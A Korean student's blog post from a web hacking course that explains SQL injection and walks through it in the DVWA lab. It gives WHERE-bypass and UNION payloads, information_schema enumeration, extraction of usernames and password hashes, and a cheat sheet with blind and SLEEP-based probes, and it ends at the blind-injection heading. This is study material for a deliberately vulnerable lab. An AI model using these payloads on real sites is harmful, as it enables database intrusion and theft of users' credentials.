---
title:  '[강의] 5주차 웹 해킹- 웹 해킹 기술 탐색 4'
excerpt: "week5"

categories:
  - study
  - etc
  - hacking
tags: [study, etc, virtualbox, kalilinux, hacking]

last_modified_at: 2021-07-22T08:06:00-05:00
classes: wide
---

### 8주간의 해킹 스터디 다섯번째 시간

벌써 5주차가 되었다. 시간이 참 빠른 것 같다. 내가 연구할 분야와는 관련이 없지만 알아두면 매우 좋을것 같아서 듣는 내내 유익해서 여기까지 온 것 같다 ㅎㅎ

강의링크는 오른쪽 클릭! => [goormedu](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)

<br>
이번 시간은 공격에 성공할 경우 큰 피해를 입힐 수 있는 SQL문 주입을 통해 데이터베이스를 조작하는 **SQL 인젝션 공격**에 대해 알아보겠습니다.

<hr>

### SQL 인젝션 공격

DB에 전송되는 SQL 쿼리문을 조작해 DB내의 데이터를 변조하거나 다른 사용자의 개인정보와 같이 허가되지 않은 정보에 접근하는 공격이다. 웹사이트의 회원정보 등 개인정보를 빼내는 공격으로 최근까지 꾸준히 사용된다고 한다.🥵🥵

SQL 인젝션 공격에는 기본 2가지가 있다. 

### 1. where 구문 공격

ID가 1인 사용자 정보를 요청하는 시나리오!

요청을 받으면 웹어플리케이션은 내부 DB로 조건문 `WHERE`을 포함하나 SQL 쿼리문을 전송하는데, 쿼리문을 해석해보면 ID=1 인 사용자의 이름과 이메일을 가져오라는 것이다.

이 쿼리가 실행이 되면 ID가 1인 사용자 정보가 웹어플리케이션을 통해 사용자에게 전송된다. 

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

이때! 해커가 1 뒤에 `' or '1'='1` 이런식으로 조작해서 보낸다. 즉, **'1'='1 이라는 항상 참**이되는 조건으로 조작을 해버린 것이다. 🥵🥵🥵

![image](https://user-images.githubusercontent.com/53431568/126730455-9a1af10f-d59e-4c40-a464-a2bf14e4ee4a.png)

결국 WHERE 구문이 우회가 되며 모든사용자의 개인정보를 반환하게 된다.

![image](https://user-images.githubusercontent.com/53431568/126730546-54b50da6-66c5-4bba-adcc-8308b3186c19.png)



### 2. UNION

똑같은 시나리오를 가정하자!

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

이번에 해커는 or 대신에 `union` 을 이용해 뒤에 PASSWORD를 요청하는 구문을 실행하였다.

아래 그림과 같이 union을 사이에 두고 SELECT 구문 두개가 배치되는 것을 볼 수 있다. => **`union은 합집합 개념으로 두개의 구문을 포함해 실행시킨다.`**

끝에 삽입된 #은 뒤에 오는 쿼리문을 생략한다는 뜻으로 해커가 원하는 명령어만 실행하여 공격할 수 있게 된다.🙀🙀 증말 흥미진진하다 ㅋㅋㅋ

![image](https://user-images.githubusercontent.com/53431568/126730690-03ad46b7-0063-4d21-9f11-d4839825affc.png)

이런식으로 정보를 빼내게 된다.

![image](https://user-images.githubusercontent.com/53431568/126730890-f88395e8-a76c-4ca6-9d17-9b3a2af79c23.png)


<br>

이제 재미있는 실습의 시간이다 ㅎㅎ

###  SQL 인젝션 공격 실습

### (1) LOW 단계 - WHERE

먼저 security를 low로 설정하고 SQL Injection 페이지에서 User ID: 1 을 입력하면 다음과 같이 정보가 출력된다.

![image](https://user-images.githubusercontent.com/53431568/126731020-c9dc323e-9e78-4471-a5f1-2a95a113e45e.png)

소스코드를 확인해 어떻게 동작하는지 알아보자!

다음과 같이 query 문을 보면 id가 들어오는 부분에 이미 `'$id'` 처럼 `작은따옴표 두개('')` 로 둘러쌓인것을 볼 수 있다. 

이 곳에 또 다른 작은따옴표가 들어오면 총 `user_id='''` 이런식으로 작은따옴표가 3개가 되어 에러가 발생한다. 한번 확인해보자!

![image](https://user-images.githubusercontent.com/53431568/126731183-4186e00b-b6b5-44d1-948d-f0922a8ecacc.png)


작은따옴표 ' 를 입력하였더니 정말 에러가 발생하였다. 이렇게 **비정상적인 문자를 입력했을 때 SQL쿼리문이 잘못되어 에러가 나면 해당 페이지는 SQL쿼리문을 사용하여 동작**한다는 것을 해커는 눈치챌 수 있으며 이것을 보고 SQL 쿼리문으로 공격할 수 있구나!! 라고 여지를 주게 되는 것이다.

![image](https://user-images.githubusercontent.com/53431568/126731075-df49a603-5c6e-4fef-b9d2-d3f207fc95c4.png)

이번엔 **1' or '1'='1**을 실행해보면 테이블의 모든 정보가 출력되었다.!! ID가 1이라는 것과 상관없이 모든 사용자의 정보가 나오게 된 것이다. 

![image](https://user-images.githubusercontent.com/53431568/126731533-22390548-dd64-41cd-bea2-80f8b15b7b0d.png)

위에서 설명한 # 을 이용하여 작은따옴표(')를 입력해도 에러가 발생하지 않게 해보자.
'ID' 이런식으로 작은따옴표 안에 ID가 감싸지므로 `**'#**` 을 입력한다면 ''id#' 으로 값이 들어가고 #뒤의 명령어는 주석처리 되므로 작은따옴표(')가 2개가 되어 에러가 발생하지 않게 되는 것이다.
 
![image](https://user-images.githubusercontent.com/53431568/126731668-6989cb9a-de8c-4a58-83f6-ac783bdbe99c.png)



### (1) LOW 단계 - UNION

UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 사용하려면 `**원래 쿼리문이 조회하는 SELECT문의 칼럼갯수**`와 `**UNION뒤의 SELECT문에서 요청하는 칼럼수**`가 같아야 한다. 아니면 에러발생! 

따라서 **원래 쿼리문이 몇개의 칼럼을 반환 하는지 알아내야 한다.** 

실행해보자! 다음과 같이 명령어를 입력하면... 
![image](https://user-images.githubusercontent.com/53431568/126732180-8989ba20-2282-4cb0-9bd4-9fda738ca14d.png)

칼럼수가 맞지 않는다는 경고 메세지를 보여준다.

![image](https://user-images.githubusercontent.com/53431568/126732164-2e94daea-17c2-4c10-83b6-7a01744f7e0d.png)

이번에는 칼럼 2개를 넣어보았더니 아래와 같이 결과가 출력되었다.! 즉, union 이전 쿼리문은 2개의 칼럼을 조회한다는 것을 알아내었다.

![image](https://user-images.githubusercontent.com/53431568/126732267-6f651c08-4da5-43a9-94ed-a47980280fea.png)

다른 방법을 이용해서도 칼럼갯수를 알 수 있다. 바로 `ORDER BY`라는 키워드를 이용하는 것이다. 이 키워드는 어떤 칼럼을 기준으로 정렬할때 쓰는 구문인데 칼럼의 갯수보다 크면 에러가 발생하게 된다. 따라서 원래 칼럼갯수를 맞출 수 있다. 

2일때, 

![image](https://user-images.githubusercontent.com/53431568/126732412-d6fe50ed-46c4-4b81-85a3-ef6f2fb0af6e.png)

3일때, 3이라는 칼럼을 알 수 없다라는 에러메세지를 출력한다. 따라서 2개의 칼럼까지 있다는 것을 알 수 있다. 
![image](https://user-images.githubusercontent.com/53431568/126732428-2d3c492c-92a4-46cb-9dd5-9f0b3d9c7e42.png)

이제 union 공격을 해보자!🙋🏽🙋🏽



#### 데이터베이스 명 조회

~~~sql 
1' union select schema_name,1 from information_schema.schemata #
~~~

![image](https://user-images.githubusercontent.com/53431568/126734180-ee4edb97-9856-46f9-9c3c-71c3d9ca07d5.png)


#### dvwa 데이터베이스의 테이블 명 조회

~~~sql 
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
~~~
 
위의 명령어를 통해 guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
 
![image](https://user-images.githubusercontent.com/53431568/126734262-bc25ea5c-2802-4bd8-95bf-d94b0cbc18cb.png)



#### users 테이블 칼럼 조회
~~~sql 
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#
~~~ 

user_id, first name, surname, passwd 를 보여준다.

![image](https://user-images.githubusercontent.com/53431568/126734314-e90e55e6-27e0-42a2-bd36-83dff156ba39.png)



이제, users 테이블에서 사용자이름과 password 만 출력해보자!

~~~sql 
1' union select user,password from users#
~~~

아래와 같이 사용자명과 password가 surname에 해쉬값의 형태로 출력되었다.




구글탭에 해쉬값을 넣어 password를 알아보면 어떤 문자열인지 알 수 있다. 



<br><br>

이 밖에도 다양한 명령어들로 공격을 할 수 있다. 명령어들을 정리해두었다.

<details markdown="1">
<summary>명령어 정리🔎</summary>

~~~sql 
# WHERE 구문 우회
1' or '1'='1

# UNION을 이용한 칼럼 갯수 알아내기
1' union select 1,1#

# ORDER BY 구문을 이용한 칼럼 갯수 알아내기
1' order by 2#

# 데이터베이스 명 조회
1' union select schema_name,1 from information_schema.schemata #

# dvwa 데이터베이스의 테이블 명 조회
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #

# users 테이블 칼럼 조회
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 

# 블라인드 SQL 인젝션 참 구문
1' AND 1=1# 

# 블라인드 SQL 인젝션 거짓 구문
1' AND 1=2#

# 시간기반 블라인드 SQL 인젝션 탐지 구문
1' AND SLEEP(5)#
~~~

</details>

<br><br>



### (2) 블라인드 SQL 인젝션



